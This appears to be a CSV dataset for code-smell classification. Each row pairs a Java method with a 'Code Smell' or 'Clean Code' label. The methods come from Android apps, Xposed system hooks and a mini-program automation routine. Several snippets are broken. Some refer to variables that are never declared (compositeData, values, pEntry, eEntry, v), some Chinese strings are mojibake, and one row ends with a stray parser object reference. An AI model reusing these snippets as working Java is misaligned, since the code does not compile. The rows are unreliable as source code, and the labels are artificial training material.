text,label,text_label
"@RequiresApi(api=Build.VERSION_CODES.Q) private static Uri saveFileInternal(int type,File sourceFile,String filename){
  try {
    int selectedType=type;
    ContentValues contentValues=new ContentValues();
    String extension=FileLoader.getFileExtension(sourceFile);
    String mimeType=null;
    if (extension != null) {
      mimeType=MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);
    }
    Uri uriToInsert=null;
    if ((type == 0 || type == 1) && mimeType != null) {
      if (mimeType.startsWith(""image"")) {
        selectedType=0;
      }
      if (mimeType.startsWith(""video"")) {
        selectedType=1;
      }
    }
    final String folderName=NekoConfig.customSavePath.String();
    if (selectedType == 0) {
      if (filename == null) {
        filename=AndroidUtilities.generateFileName(0,extension);
      }
      uriToInsert=MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY);
      File dirDest=new File(Environment.DIRECTORY_PICTURES,folderName);
      contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH,dirDest + File.separator);
      contentValues.put(MediaStore.Images.Media.DISPLAY_NAME,filename);
      contentValues.put(MediaStore.Images.Media.MIME_TYPE,mimeType);
    }
 else     if (selectedType == 1) {
      if (filename == null) {
        filename=AndroidUtilities.generateFileName(1,extension);
      }
      File dirDest=new File(Environment.DIRECTORY_MOVIES,folderName);
      contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH,dirDest + File.separator);
      uriToInsert=MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY);
      contentValues.put(MediaStore.Video.Media.DISPLAY_NAME,filename);
    }
 else     if (selectedType == 2) {
      if (filename == null) {
        filename=sourceFile.getName();
      }
      File dirDest=new File(Environment.DIRECTORY_DOWNLOADS,folderName);
      contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH,dirDest + File.separator);
      uriToInsert=MediaStore.Downloads.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY);
      contentValues.put(MediaStore.Downloads.DISPLAY_NAME,filename);
    }
 else {
      if (filename == null) {
        filename=sourceFile.getName();
      }
      File dirDest=new File(Environment.DIRECTORY_MUSIC,folderName);
      contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH,dirDest + File.separator);
      uriToInsert=MediaStore.Audio.Media.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY);
      contentValues.put(MediaStore.Audio.Media.DISPLAY_NAME,filename);
    }
    contentValues.put(MediaStore.MediaColumns.MIME_TYPE,mimeType);
    Uri dstUri=ApplicationLoader.applicationContext.getContentResolver().insert(uriToInsert,contentValues);
    if (dstUri != null) {
      FileInputStream fileInputStream=new FileInputStream(sourceFile);
      OutputStream outputStream=ApplicationLoader.applicationContext.getContentResolver().openOutputStream(dstUri);
      AndroidUtilities.copyFile(fileInputStream,outputStream);
      fileInputStream.close();
    }
    return dstUri;
  }
 catch (  Exception e) {
    FileLog.e(e);
    return null;
  }
}",1,Code Smell
"private static Collection<WalletTransaction> getWalletTransactions(Wallet wallet,boolean includeAllChildWallets){
  Map<BlockTransaction,WalletTransaction> walletTransactionMap=new HashMap<>(wallet.getTransactions().size());
  for (  KeyPurpose keyPurpose : wallet.getWalletKeyPurposes()) {
    getWalletTransactions(wallet,walletTransactionMap,wallet.getNode(keyPurpose));
  }
  for (  Wallet childWallet : wallet.getChildWallets()) {
    if (includeAllChildWallets || childWallet.isNested()) {
      for (      KeyPurpose keyPurpose : childWallet.getWalletKeyPurposes()) {
        getWalletTransactions(childWallet,walletTransactionMap,childWallet.getNode(keyPurpose));
      }
    }
  }
  List<WalletTransaction> walletTransactions=new ArrayList<>(walletTransactionMap.values());
  Collections.sort(walletTransactions);
  return walletTransactions;
}
private static void getWalletTransactions(Wallet wallet,Map<BlockTransaction,WalletTransaction> walletTransactionMap,WalletNode purposeNode){
  KeyPurpose keyPurpose=purposeNode.getKeyPurpose();
  List<WalletNode> childNodes=new ArrayList<>(purposeNode.getChildren());
  Wallet transactionsWallet=wallet.isNested() ? wallet.getMasterWallet() : wallet;
  for (  WalletNode addressNode : childNodes) {
    for (    BlockTransactionHashIndex hashIndex : addressNode.getTransactionOutputs()) {
      BlockTransaction inputTx=transactionsWallet.getWalletTransaction(hashIndex.getHash());
      if (inputTx != null) {
        WalletTransaction inputWalletTx=walletTransactionMap.get(inputTx);
        if (inputWalletTx == null) {
          inputWalletTx=new WalletTransaction(wallet,inputTx);
          walletTransactionMap.put(inputTx,inputWalletTx);
        }
        inputWalletTx.incoming.put(hashIndex,keyPurpose);
        if (hashIndex.getSpentBy() != null) {
          BlockTransaction outputTx=transactionsWallet.getWalletTransaction(hashIndex.getSpentBy().getHash());
          if (outputTx != null) {
            WalletTransaction outputWalletTx=walletTransactionMap.get(outputTx);
            if (outputWalletTx == null) {
              outputWalletTx=new WalletTransaction(wallet,outputTx);
              walletTransactionMap.put(outputTx,outputWalletTx);
            }
            outputWalletTx.outgoing.put(hashIndex.getSpentBy(),keyPurpose);
          }
        }
      }
    }
  }
}
",1,Code Smell
"@Override protected void onAuthenticated(@Nullable Bundle savedInstanceState){
  final Intent intent=getIntent();
  if (intent == null) {
    triggerCancel();
    return;
  }
  Log.d(TAG,""On create, intent: %s"",intent);
  if (ACTION_PACKAGE_INSTALLED.equals(intent.getAction())) {
    onNewIntent(intent);
    return;
  }
  mModel=new ViewModelProvider(this).get(PackageInstallerViewModel.class);
  if (!bindService(new Intent(this,PackageInstallerService.class),mServiceConnection,BIND_AUTO_CREATE)) {
    throw new RuntimeException(""Unable to bind PackageInstallerService"");
  }
synchronized (mApkQueue) {
    mApkQueue.addAll(ApkQueueItem.fromIntent(intent));
  }
  ApkSource apkSource=IntentCompat.getParcelableExtra(intent,EXTRA_APK_FILE_LINK,ApkSource.class);
  if (apkSource != null) {
synchronized (mApkQueue) {
      mApkQueue.add(ApkQueueItem.fromApkSource(apkSource));
    }
  }
  mModel.packageInfoLiveData().observe(this,newPackageInfo -> {
    if (newPackageInfo == null) {
      mDialogHelper.showParseFailedDialog(v -> triggerCancel());
      return;
    }
    mDialogHelper.onParseSuccess(mModel.getAppLabel(),getVersionInfoWithTrackers(newPackageInfo),mModel.getAppIcon(),v -> displayInstallerOptions((dialog1,which,options) -> {
      if (options != null) {
        mInstallerOptions.copy(options);
      }
    }
));
    displayChangesOrInstallationPrompt();
  }
);
  mModel.packageUninstalledLiveData().observe(this,success -> {
    if (success) {
      install();
    }
 else {
      showInstallationFinishedDialog(mModel.getPackageName(),getString(R.string.failed_to_uninstall_app),null,false);
    }
  }
);
  mInstallerDialogFragment=new InstallerDialogFragment();
  mInstallerDialogFragment.setCancelable(false);
  mInstallerDialogFragment.setFragmentStartedCallback(this::init);
  mInstallerDialogFragment.showNow(getSupportFragmentManager(),InstallerDialogFragment.TAG);
}",1,Code Smell
"private Map<String,String> extractAttributeValue(AttributeList attributeList){
  if (attributeList == null || attributeList.isEmpty()) {
    throw new RuntimeException(""attributeList is empty"");
  }
  Map<String,String> attributeValueMap=new HashMap<>(attributeList.size());
  for (  Attribute attribute : attributeList.asList()) {
    Object value=attribute.getValue();
    if (value == null) {
      log.info(""attribute {} value is null."",attribute.getName());
      continue;
    }
    if (value instanceof Number || value instanceof String || value instanceof ObjectName|| value instanceof Boolean|| value instanceof Date|| value instanceof TimeUnit) {
      attributeValueMap.put(attribute.getName(),value.toString());
    }
 else     if (value instanceof CompositeData) {
      CompositeType compositeType=compositeData.getCompositeType();
      for (      String typeKey : compositeType.keySet()) {
        Object fieldValue=compositeData.get(typeKey);
        attributeValueMap.put(attribute.getName() + SUB_ATTRIBUTE + typeKey,fieldValue.toString());
      }
    }
 else     if (value instanceof String[]) {
      StringBuilder builder=new StringBuilder();
      for (int index=0; index < values.length; index++) {
        builder.append(values[index]);
        if (index < values.length - 1) {
          builder.append("","");
        }
      }
      attributeValueMap.put(attribute.getName(),builder.toString());
    }
 else {
      log.warn(""attribute value type {} not support."",value.getClass().getName());
    }
  }
  return attributeValueMap;
}",1,Code Smell
"/** 
 * Processes work list entries until the work list is empty.
 */
private void analyze(){
  while (!workList.isEmpty() && !isTimeout) {
    while (!workList.isEmpty() && !isTimeout) {
      WorkList.Entry entry=workList.pollEntry();
      if (entry instanceof WorkList.PointerEntry) {
        Pointer p=pEntry.pointer();
        PointsToSet pts=pEntry.pointsToSet();
        PointsToSet diff=propagate(p,pts);
        if (!diff.isEmpty() && p instanceof CSVar) {
          processInstanceStore(v,diff);
          processInstanceLoad(v,diff);
          processArrayStore(v,diff);
          processArrayLoad(v,diff);
          processCall(v,diff);
          plugin.onNewPointsToSet(v,diff);
        }
      }
 else       if (entry instanceof WorkList.CallEdgeEntry) {
        processCallEdge(eEntry.edge());
      }
    }
    plugin.onPhaseFinish();
  }
  if (!workList.isEmpty() && isTimeout) {
    logger.warn(""Pointer analysis stops early as it reaches time limit ({} seconds),"" + "" and the result may be unsound!"",timeLimit);
  }
 else   if (timeLimiter != null) {
    timeLimiter.stop();
  }
  plugin.onFinish();
}
",1,Code Smell
"@Override public void onItemClick(int id){
  if (id == -1) {
    if (actionBar.isActionModeShowed()) {
      hideActionMode();
    }
 else {
      finishFragment();
    }
  }
 else   if (id == deleteId) {
    AlertDialog.Builder builder=new AlertDialog.Builder(getParentActivity(),resourcesProvider);
    builder.setTitle(LocaleController.formatPluralString(""DeleteTones"",selectedTones.size()));
    builder.setMessage(AndroidUtilities.replaceTags(LocaleController.formatPluralString(""DeleteTonesMessage"",selectedTones.size())));
    builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),(dialog,which) -> {
      dialog.dismiss();
    }
);
    builder.setPositiveButton(LocaleController.getString(""Delete"",R.string.Delete),(dialog,which) -> {
      deleteSelectedMessages();
      dialog.dismiss();
    }
);
    AlertDialog dialog=builder.show();
    TextView button=(TextView)dialog.getButton(DialogInterface.BUTTON_POSITIVE);
    if (button != null) {
      button.setTextColor(Theme.getColor(Theme.key_dialogTextRed,resourcesProvider));
    }
  }
 else   if (id == shareId) {
    if (selectedTones.size() == 1) {
      Intent intent=new Intent(context,LaunchActivity.class);
      intent.setAction(Intent.ACTION_SEND);
      Uri uri=selectedTones.valueAt(0).getUriForShare(currentAccount);
      if (uri != null) {
        intent.putExtra(Intent.EXTRA_STREAM,uri);
        context.startActivity(intent);
      }
    }
 else {
      Intent intent=new Intent(context,LaunchActivity.class);
      intent.setAction(Intent.ACTION_SEND_MULTIPLE);
      ArrayList<Uri> uries=new ArrayList<>();
      for (int i=0; i < selectedTones.size(); i++) {
        Uri uri=selectedTones.valueAt(i).getUriForShare(currentAccount);
        if (uri != null) {
          uries.add(uri);
        }
      }
      if (!uries.isEmpty()) {
        intent.putParcelableArrayListExtra(Intent.EXTRA_STREAM,uries);
        context.startActivity(intent);
      }
    }
    hideActionMode();
    updateRows();
    adapter.notifyDataSetChanged();
  }
}",1,Code Smell
"private static void antdodoPropList(){
  try {
    JSONObject jo=new JSONObject(AntForestRpcCall.antdodoPropList());
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      JSONArray propList=jo.getJSONObject(""data"").optJSONArray(""propList"");
      for (int i=0; i < propList.length(); i++) {
        JSONObject prop=propList.getJSONObject(i);
        String propType=prop.getString(""propType"");
        if (""COLLECT_TIMES_7_DAYS"".equals(propType)) {
          JSONArray propIdList=prop.getJSONArray(""propIdList"");
          String propId=propIdList.getString(0);
          String propName=prop.getJSONObject(""propConfig"").getString(""propName"");
          int holdsNum=prop.optInt(""holdsNum"",0);
          jo=new JSONObject(AntForestRpcCall.antdodoConsumeProp(propId,propType));
          if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
            JSONObject useResult=jo.getJSONObject(""data"").getJSONObject(""useResult"");
            JSONObject animal=useResult.getJSONObject(""animal"");
            String ecosystem=animal.getString(""ecosystem"");
            String name=animal.getString(""name"");
            Log.forest(""浣跨敤閬撳叿馃幁["" + propName + ""]#""+ ecosystem+ ""-""+ name);
            if (!Config.sendFriendCard().isEmpty() && !FriendIdMap.getCurrentUid().equals(Config.sendFriendCard().get(0))) {
              int fantasticStarQuantity=animal.optInt(""fantasticStarQuantity"",0);
              if (fantasticStarQuantity == 3) {
                sendCard(animal,Config.sendFriendCard().get(0));
              }
            }
            if (holdsNum > 1) {
              Thread.sleep(1000L);
              antdodoPropList();
              return;
            }
          }
 else {
            Log.recordLog(jo.getString(""resultDesc""),jo.toString());
          }
        }
      }
    }
  }
 catch (  Throwable th) {
    Log.i(TAG,""antdodoPropList err:"");
    Log.printStackTrace(TAG,th);
  }
}",1,Code Smell
"/** 
 * Generate shard array
 * @param sheetInfoList A list sheet metadata.
 * @param batchSize Size of a split.
 * @param skipNums Number of rows to skip.
 * @return An array of splits.
 */
private static InputSplit[] calculateLarkSheetInputSplits(List<SheetInfo> sheetInfoList,int batchSize,List<Integer> skipNums){
  int splitCount=0;
  if (skipNums.isEmpty()) {
    splitCount=sheetInfoList.stream().mapToInt(sheetInfo -> (int)Math.ceil((double)(sheetInfo.getSheetMeta().getRowCount() - 1) / (double)batchSize)).sum();
  }
 else {
    for (int i=0; i < sheetInfoList.size(); i++) {
      SheetInfo sheetInfo=sheetInfoList.get(i);
      int skipNum=0;
      if (skipNums.size() > i) {
        skipNum=Math.max(skipNums.get(i),0);
      }
      splitCount+=(int)Math.ceil((double)Math.max(sheetInfo.getSheetMeta().getRowCount() - 1 - skipNum,0) / (double)batchSize);
    }
  }
  InputSplit[] larkSheetInputSplits=new LarkSheetInputSplit[splitCount];
  splitCount=0;
  for (int i=0; i < sheetInfoList.size(); i++) {
    SheetInfo sheetInfo=sheetInfoList.get(i);
    SheetMeta sheetMeta=sheetInfo.getSheetMeta();
    String sheetToken=sheetInfo.getSheetToken();
    int curCount=0;
    int skipNum=0;
    if (skipNums.isEmpty()) {
      curCount=(int)Math.ceil((double)(sheetMeta.getRowCount() - 1) / (double)batchSize);
    }
 else {
      if (skipNums.size() > i) {
        skipNum=Math.max(skipNums.get(i),0);
      }
      curCount=(int)Math.ceil((double)Math.max(sheetInfo.getSheetMeta().getRowCount() - 1 - skipNum,0) / (double)batchSize);
    }
    for (int j=0; j < curCount; j++) {
      int startRowNumber=2 + j * batchSize + skipNum;
      int endRowNumber=startRowNumber + batchSize - 1;
      larkSheetInputSplits[splitCount]=new LarkSheetInputSplit(sheetMeta,sheetToken,sheetMeta.getSheetId(),startRowNumber,endRowNumber);
      splitCount+=1;
    }
  }
  return larkSheetInputSplits;
}",1,Code Smell
"private void handleAdPrepareError(int adGroupIndex,int adIndexInAdGroup,Exception exception){
  if (DEBUG) {
    Log.d(TAG,""Prepare error for ad "" + adIndexInAdGroup + "" in group ""+ adGroupIndex,exception);
  }
  if (adsManager == null) {
    Log.w(TAG,""Ignoring ad prepare error after release"");
    return;
  }
  if (imaAdState == IMA_AD_STATE_NONE) {
    fakeContentProgressElapsedRealtimeMs=SystemClock.elapsedRealtime();
    fakeContentProgressOffsetMs=C.usToMs(adPlaybackState.adGroupTimesUs[adGroupIndex]);
    if (fakeContentProgressOffsetMs == C.TIME_END_OF_SOURCE) {
      fakeContentProgressOffsetMs=contentDurationMs;
    }
    shouldNotifyAdPrepareError=true;
  }
 else {
    if (adIndexInAdGroup > playingAdIndexInAdGroup) {
      for (int i=0; i < adCallbacks.size(); i++) {
        adCallbacks.get(i).onEnded();
      }
    }
    playingAdIndexInAdGroup=adPlaybackState.adGroups[adGroupIndex].getFirstAdIndexToPlay();
    for (int i=0; i < adCallbacks.size(); i++) {
      adCallbacks.get(i).onError();
    }
  }
  adPlaybackState=adPlaybackState.withAdLoadError(adGroupIndex,adIndexInAdGroup);
  updateAdPlaybackState();
}",1,Code Smell
"/** 
 * 璇曟帰 {@linkplain Dialect}銆�
 * @param cn
 * @return
 * @throws DialectException
 */
protected Dialect getDetectiveDialect(Connection cn) throws DialectException {
  try {
    Object cacheKey=getDialectBuilderCacheKey(cn);
    DialectBuilder cached=(cacheKey == null ? null : this.dialectBuilderCache.get(cacheKey));
    if (cached != null)     return cached.build(cn);
 else {
      DatabaseMetaData databaseMetaData=cn.getMetaData();
      CombinedDialectBuilder combinedDialectBuilder=new CombinedDialectBuilder();
      if (this.dialectBuilders != null) {
        TestInfo testInfo=buildTestInfo(cn,databaseMetaData);
        if (testInfo != null) {
          for (          DialectBuilder dialectBuilder : this.dialectBuilders) {
            Dialect dialect=null;
            try {
              dialect=dialectBuilder.build(cn);
            }
 catch (            Throwable e) {
              dialect=null;
            }
            if (dialect != null && combinedDialectBuilder.getToPagingQuerySqlDialectBuilder() == null) {
              try {
                if (testDialectToPagingSql(cn,databaseMetaData,testInfo,dialect))                 combinedDialectBuilder.setToPagingQuerySqlDialectBuilder(dialectBuilder);
              }
 catch (              Throwable e) {
              }
            }
          }
        }
      }
      if (cacheKey != null)       this.dialectBuilderCache.putIfAbsent(cacheKey,combinedDialectBuilder);
      return combinedDialectBuilder.build(cn);
    }
  }
 catch (  SQLException e) {
    throw new DialectException(e);
  }
}
",1,Code Smell
"private KernelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private KernelProto(){
  className_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@30db5aaf",0,Clean Code
"private void setCheckedEnableReactionCell(int selectType,boolean animated){
  if (selectedType == selectType) {
    return;
  }
  boolean checked=selectType == SELECT_TYPE_SOME || selectType == SELECT_TYPE_ALL;
  enableReactionsCell.setChecked(checked);
  int clr=Theme.getColor(checked ? Theme.key_windowBackgroundChecked : Theme.key_windowBackgroundUnchecked);
  if (animated) {
    if (checked) {
      enableReactionsCell.setBackgroundColorAnimated(true,clr);
    }
 else {
      enableReactionsCell.setBackgroundColorAnimatedReverse(clr);
    }
  }
 else {
    enableReactionsCell.setBackgroundColor(clr);
  }
  this.selectedType=selectType;
  if (selectType == SELECT_TYPE_SOME || selectType == SELECT_TYPE_ALL) {
    switchLayout.setVisibility(View.VISIBLE);
    actionButton.setVisibility(View.VISIBLE);
    if (animated) {
      actionButton.animate().setListener(null).cancel();
      switchLayout.animate().setListener(null).cancel();
      switchLayout.animate().alpha(1f).setDuration(350).setInterpolator(CubicBezierInterpolator.DEFAULT).setListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          editText.setFocusableInTouchMode(true);
        }
      }
).start();
      actionButton.animate().alpha(1f).setDuration(350).setInterpolator(CubicBezierInterpolator.DEFAULT).start();
      if (selectedEmojisMap.isEmpty()) {
        selectAnimatedEmojiDialog.clearSelectedDocuments();
        editText.setText("""");
        int i=0;
        SpannableStringBuilder editable=new SpannableStringBuilder();
        for (        TLRPC.TL_availableReaction availableReaction : allAvailableReactions) {
          addReactionToEditText(availableReaction,selectedEmojisMap,selectedEmojisIds,editable,selectAnimatedEmojiDialog,editText.getFontMetricsInt());
          i++;
          if (i >= maxReactionsCount) {
            break;
          }
        }
        editText.append(editable);
        editText.addReactionsSpan();
        selectAnimatedEmojiDialog.notifyDataSetChanged();
        checkMaxCustomReactions(false);
      }
    }
  }
 else {
    if (animated) {
      closeKeyboard();
      actionButton.animate().setListener(null).cancel();
      switchLayout.animate().setListener(null).cancel();
      actionButton.animate().alpha(0f).setDuration(350).setInterpolator(CubicBezierInterpolator.DEFAULT).setListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          actionButton.setVisibility(View.INVISIBLE);
        }
      }
).start();
      switchLayout.animate().alpha(0f).setDuration(350).setInterpolator(CubicBezierInterpolator.DEFAULT).setListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          editText.setFocusableInTouchMode(false);
          switchLayout.setVisibility(View.INVISIBLE);
        }
      }
).start();
    }
 else {
      switchLayout.setVisibility(View.INVISIBLE);
      actionButton.setVisibility(View.INVISIBLE);
    }
  }
}",1,Code Smell
"@Override @Implemented(EasyRecyclerView.OnItemClickListener.class) public boolean onItemClick(EasyRecyclerView parent,View view,int position,long id){
  if (mDrawerLayout != null && mDrawerLayout.isDrawerOpen(Gravity.RIGHT)) {
    if (mRecyclerView != null && mRecyclerView.isInCustomChoice()) {
      return true;
    }
    if (mUrlBuilder == null || mHelper == null) {
      return true;
    }
    int newFavCat=position - 2;
    if (mUrlBuilder.getFavCat() == newFavCat) {
      return true;
    }
    if (mRecyclerView != null) {
      mRecyclerView.isInCustomChoice();
    }
    exitSearchMode(true);
    mUrlBuilder.setKeyword(null);
    mUrlBuilder.setFavCat(newFavCat);
    updateSearchBar();
    mHelper.refresh();
    closeDrawer(Gravity.RIGHT);
  }
 else {
    if (mRecyclerView != null && mRecyclerView.isInCustomChoice()) {
      mRecyclerView.toggleItemChecked(position);
    }
 else     if (mHelper != null) {
      GalleryInfo gi=mHelper.getDataAtEx(position);
      if (gi == null) {
        return true;
      }
      Bundle args=new Bundle();
      args.putString(GalleryDetailScene.KEY_ACTION,GalleryDetailScene.ACTION_GALLERY_INFO);
      args.putParcelable(GalleryDetailScene.KEY_GALLERY_INFO,gi);
      Announcer announcer=new Announcer(GalleryDetailScene.class).setArgs(args);
      View thumb;
      if (null != (thumb=view.findViewById(R.id.thumb))) {
        announcer.setTranHelper(new EnterGalleryDetailTransaction(thumb));
      }
      startScene(announcer);
    }
  }
  return true;
}",1,Code Smell
"@Override public void init() throws NoSuchMethodException {
  findAndHookMethod(""com.android.server.wm.ActivityTaskManagerService"",""onSystemReady"",new MethodHook(){
    @Override protected void after(    MethodHookParam param){
      try {
        Context context=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
        if (context == null)         return;
        if (!isObserver) {
          ContentObserver contentObserver=new ContentObserver(new Handler(context.getMainLooper())){
            @Override public void onChange(            boolean selfChange,            @Nullable Uri uri,            int flags){
              isLock=getLockApp(context) != -1;
              if (isLock) {
                taskId=getLockApp(context);
                XposedHelpers.callMethod(param.thisObject,""startSystemLockTaskMode"",taskId);
                needLockScreen=getMyLockScreen(context) == 1;
              }
 else {
                new Handler(context.getMainLooper()).postDelayed(() -> XposedHelpers.callMethod(param.thisObject,""stopSystemLockTaskMode""),300);
              }
            }
          }
;
          context.getContentResolver().registerContentObserver(Settings.Global.getUriFor(""key_lock_app""),false,contentObserver);
          isObserver=true;
        }
      }
 catch (      Throwable e) {
        logE(TAG,""E: "" + e);
      }
    }
  }
);
  findAndHookMethod(""com.miui.server.input.util.ShortCutActionsUtils"",""triggerHapticFeedback"",boolean.class,String.class,String.class,boolean.class,String.class,new MethodHook(){
    @Override protected void after(    MethodHookParam param){
      if (!mPrefsMap.getBoolean(""system_framework_guided_access_status""))       return;
      String shortcut=(String)param.args[1];
      if (""imperceptible_press_power_key"".equals(shortcut) || ""long_press_power_key"".equals(shortcut)) {
        Context context=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
        isLock=getLockApp(context) != -1;
        if (isLock) {
          setLockApp(context,-1);
        }
      }
    }
  }
);
  findAndHookMethod(""com.android.server.wm.LockTaskController"",""shouldLockKeyguard"",int.class,new MethodHook(){
    @Override protected void before(    MethodHookParam param){
      if (needLockScreen) {
        param.setResult(true);
      }
 else {
        param.setResult(false);
      }
    }
  }
);
  if (isPad()) {
    findAndHookMethod(""com.android.server.wm.MiuiCvwGestureController$GesturePointerEventListener"",""onPointerEvent"",MotionEvent.class,new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        if (isLock) {
          param.setResult(null);
        }
      }
    }
);
  }
}",1,Code Smell
"public static CustomControls convertV1Layout(JSONObject oldLayoutJson) throws JSONException {
  CustomControls empty=new CustomControls();
  JSONArray layoutMainArray=oldLayoutJson.getJSONArray(""mControlDataList"");
  for (int i=0; i < layoutMainArray.length(); i++) {
    JSONObject button=layoutMainArray.getJSONObject(i);
    ControlData n_button=new ControlData();
    int[] keycodes=new int[]{LwjglGlfwKeycode.GLFW_KEY_UNKNOWN,LwjglGlfwKeycode.GLFW_KEY_UNKNOWN,LwjglGlfwKeycode.GLFW_KEY_UNKNOWN,LwjglGlfwKeycode.GLFW_KEY_UNKNOWN};
    n_button.dynamicX=button.getString(""dynamicX"");
    n_button.dynamicY=button.getString(""dynamicY"");
    if (!Tools.isValidString(n_button.dynamicX) && button.has(""x"")) {
      double buttonC=button.getDouble(""x"");
      double ratio=buttonC / CallbackBridge.physicalWidth;
      n_button.dynamicX=ratio + "" * ${screen_width}"";
    }
    if (!Tools.isValidString(n_button.dynamicY) && button.has(""y"")) {
      double buttonC=button.getDouble(""y"");
      double ratio=buttonC / CallbackBridge.physicalHeight;
      n_button.dynamicY=ratio + "" * ${screen_height}"";
    }
    n_button.name=button.getString(""name"");
    n_button.opacity=((float)((button.getInt(""transparency"") - 100) * -1)) / 100f;
    n_button.passThruEnabled=button.getBoolean(""passThruEnabled"");
    n_button.isToggle=button.getBoolean(""isToggle"");
    n_button.setHeight(button.getInt(""height""));
    n_button.setWidth(button.getInt(""width""));
    n_button.bgColor=0x4d000000;
    n_button.strokeWidth=0;
    if (button.getBoolean(""isRound"")) {
      n_button.cornerRadius=35f;
    }
    int next_idx=0;
    if (button.getBoolean(""holdShift"")) {
      keycodes[next_idx]=LwjglGlfwKeycode.GLFW_KEY_LEFT_SHIFT;
      next_idx++;
    }
    if (button.getBoolean(""holdCtrl"")) {
      keycodes[next_idx]=LwjglGlfwKeycode.GLFW_KEY_LEFT_CONTROL;
      next_idx++;
    }
    if (button.getBoolean(""holdAlt"")) {
      keycodes[next_idx]=LwjglGlfwKeycode.GLFW_KEY_LEFT_ALT;
      next_idx++;
    }
    keycodes[next_idx]=button.getInt(""keycode"");
    n_button.keycodes=keycodes;
    empty.mControlDataList.add(n_button);
  }
  empty.scaledAt=(float)oldLayoutJson.getDouble(""scaledAt"");
  empty.version=3;
  return empty;
}",1,Code Smell
"public void updateAll(){
  for (int i=0; i < viewPager.viewPages.length; ++i) {
    if (viewPager.viewPages[i] instanceof Page) {
      Page page=(Page)viewPager.viewPages[i];
      if (page.currentTab == TAB_FORWARD) {
        page.messages=messagePreviewParams.forwardMessages;
      }
 else       if (page.currentTab == TAB_REPLY) {
        page.messages=messagePreviewParams.replyMessage;
      }
 else       if (page.currentTab == TAB_LINK) {
        page.messages=messagePreviewParams.linkMessage;
      }
      page.updateMessages();
      if (page.currentTab == TAB_REPLY) {
        if (showOutdatedQuote && !messagePreviewParams.isSecret) {
          MessageObject msg=null;
          if (page.textSelectionHelper.getSelectedCell() != null) {
            msg=page.textSelectionHelper.getSelectedCell().getMessageObject();
          }
          msg=page.getReplyMessage(msg);
          if (msg != null) {
            messagePreviewParams.quoteStart=0;
            messagePreviewParams.quoteEnd=Math.min(MessagesController.getInstance(currentAccount).quoteLengthMax,msg.messageOwner.message.length());
            messagePreviewParams.quote=ChatActivity.ReplyQuote.from(msg,messagePreviewParams.quoteStart,messagePreviewParams.quoteEnd);
            page.textSelectionHelper.select(page.getReplyMessageCell(),messagePreviewParams.quoteStart,messagePreviewParams.quoteEnd);
          }
        }
 else {
          messagePreviewParams.quote=null;
          page.textSelectionHelper.clear();
          page.switchToQuote(false,true);
        }
        page.updateSubtitle(true);
      }
      if (page.changeSizeBtn != null) {
        page.changeSizeBtn.animate().alpha(messagePreviewParams.hasMedia ? 1f : .5f).start();
      }
    }
  }
}",1,Code Smell
"private void applyHooks(){
  if (hooksApplied)   return;
  hooksApplied=true;
  Method[] resMethods=Resources.class.getDeclaredMethods();
  for (  Method method : resMethods) {
    String name=method.getName();
switch (name) {
case ""getInteger"":
{
        if (method.getParameterTypes().length == 1 && method.getParameterTypes()[0].equals(int.class)) {
          hookResMethod(method.getName(),int.class,hookResBefore);
        }
      }
case ""getColor"":
{
      if (method.getParameterTypes().length == 2) {
        hookResMethod(method.getName(),int.class,Resources.Theme.class,hookResBefore);
      }
    }
case ""getFraction"":
{
    if (method.getParameterTypes().length == 3) {
      hookResMethod(method.getName(),int.class,int.class,int.class,hookResBefore);
    }
  }
case ""getDrawableForDensity"":
{
  if (method.getParameterTypes().length == 3) {
    hookResMethod(method.getName(),int.class,int.class,Resources.Theme.class,hookResBefore);
  }
}
}
}
Method[] typedMethod=TypedArray.class.getDeclaredMethods();
for (Method method : typedMethod) {
if (method.getName().equals(""getColor"")) {
hookTypedMethod(method.getName(),int.class,int.class,hookTypedBefore);
}
}
}",1,Code Smell
"@Override public void call(Subscriber<? super List<ImageUrl>> subscriber){
  DocumentFile dir=getChapterDir(root,comic,chapter,title);
  List<DocumentFile> files=dir.listFiles(new DocumentFile.DocumentFileFilter(){
    @Override public boolean call(    DocumentFile file){
      return !file.getName().endsWith(""cdif"");
    }
  }
,new Comparator<DocumentFile>(){
    @Override public int compare(    DocumentFile lhs,    DocumentFile rhs){
      return lhs.getName().compareTo(rhs.getName());
    }
  }
);
  List<ImageUrl> list=Storage.buildImageUrlFromDocumentFile(files,chapter.getPath(),chapter.getCount(),chapter);
  if (list.size() != 0) {
    subscriber.onNext(list);
    subscriber.onCompleted();
  }
 else {
    subscriber.onError(new Exception());
  }
}
@Override public boolean call(DocumentFile file){
  return !file.getName().endsWith(""cdif"");
}
@Override public void call(Subscriber<? super Pair<Comic,List<Task>>> subscriber){
  root.refresh();
  DocumentFile downloadDir=DocumentUtils.getOrCreateSubDirectory(root,DOWNLOAD);
  if (downloadDir != null) {
    for (    DocumentFile sourceDir : downloadDir.listFiles()) {
      if (sourceDir.isDirectory()) {
        for (        DocumentFile comicDir : sourceDir.listFiles()) {
          Comic comic=buildComicFromDir(resolver,comicDir);
          if (comic != null) {
            List<Task> list=new LinkedList<>();
            for (            DocumentFile chapterDir : comicDir.listFiles()) {
              Task task=buildTaskFromDir(resolver,chapterDir);
              if (task != null) {
                list.add(task);
              }
            }
            if (!list.isEmpty()) {
              subscriber.onNext(Pair.create(comic,list));
            }
          }
        }
      }
    }
  }
  subscriber.onCompleted();
}",1,Code Smell
